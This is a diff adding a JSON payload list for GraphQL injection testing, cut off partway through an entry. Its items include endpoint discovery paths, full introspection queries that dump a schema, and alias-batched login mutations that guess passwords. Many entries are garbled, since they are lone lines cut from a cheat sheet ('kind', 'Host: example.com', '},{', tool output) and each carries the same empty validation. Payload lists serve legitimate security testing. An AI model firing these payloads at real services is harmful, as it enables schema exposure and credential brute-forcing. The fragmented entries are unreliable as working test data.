@@ -1,0 +1,1102 @@
+[
+  {
+    "payload_id": "OWP-37188",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "/v1/explorer",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37189",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "/v1/graphiql",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37190",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "/graph",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37191",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "/graphql",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37192",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "/graphql/console/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37193",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "/graphql.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37194",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "/graphiql",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37195",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "/graphiql.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37196",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "GET /graphql?query={yourQueryHere}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37197",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "GET /graphql?query={__schema{types{name}}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37198",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "GET /graphiql?query={__schema{types{name}}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37199",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37200",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "POST /graphql/v1 HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37201",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "Host: example.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37202",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "Content-Type: application/json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37203",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "\"query\": \"query { user { id name } }\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37204",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "?query={__schema}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37205",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "?query={}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37206",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "?query={thisdefinitelydoesnotexist}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37207",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "\"query\": \"{ __schema { types { name } } }\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37208",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37209",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "fragment FullType on __Type {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37210",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "kind",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37211",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "name",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37212",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "description",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37213",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "fields(includeDeprecated: true) {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37214",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "args {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37215",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "...InputValue",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37216",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "type {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37217",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "...TypeRef",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37218",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "isDeprecated",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37219",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "deprecationReason",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37220",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "inputFields {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37221",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "interfaces {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37222",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "enumValues(includeDeprecated: true) {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37223",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "possibleTypes {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37224",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "fragment InputValue on __InputValue {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37225",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "defaultValue",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37226",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "fragment TypeRef on __Type {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37227",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "ofType {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37228",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "query IntrospectionQuery {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37229",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "__schema {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37230",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "queryType {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37231",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "mutationType {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37232",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "types {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37233",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "...FullType",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37234",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "directives {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37235",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "locations",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37236",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37237",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37238",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "\"message\": \"Cannot query field \\\"one\\\" on type \\\"Query\\\". Did you mean \\\"node\\\"?\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37239",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "{__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37240",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "graphql-path-enum -i ./test_data/h1_introspection.json -t Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37241",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "Found 27 ways to reach the \"Skill\" node from the \"Query\" node:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37242",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37243",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37244",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37245",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37246",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37247",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37248",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37249",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37250",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37251",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37252",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37253",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37254",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37255",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37256",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "- Query (query) -> Query (skills) -> Skill",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37257",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "user {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37258",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37259",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "query {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37260",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "user(id: \"1\") {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37261",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "email",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37262",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "posts {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37263",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "title",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37264",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "comments {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37265",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "content",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37266",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "mutation{",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37267",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "signIn(login:\"Admin\", password:\"secretp@ssw0rd\"){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37268",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "token",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37269",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "addUser(id:\"1\", name:\"Dan Abramov\", email:\"dan@dan.com\") {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37270",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "\"query\":\"...\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37271",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "},{",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37272",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": ",{",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37273",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "\"query\": \"query { qname: Query { field1 } qname1: Query { field1 } }\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37274",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "mutation {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37275",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "login(pass: 1111, username: \"bob\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37276",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "second: login(pass: 2222, username: \"bob\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37277",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "third: login(pass: 3333, username: \"bob\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37278",
+    "vulnerability_category": "Injection (GraphQL)",
+    "target_technology": "GraphQL",
+    "injection_point": "body_json",
+    "payload_string": "fourth: login(pass: 4444, username: \"bob\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37279",
+    "vulnerability_category": "Injection (GraphQL)",
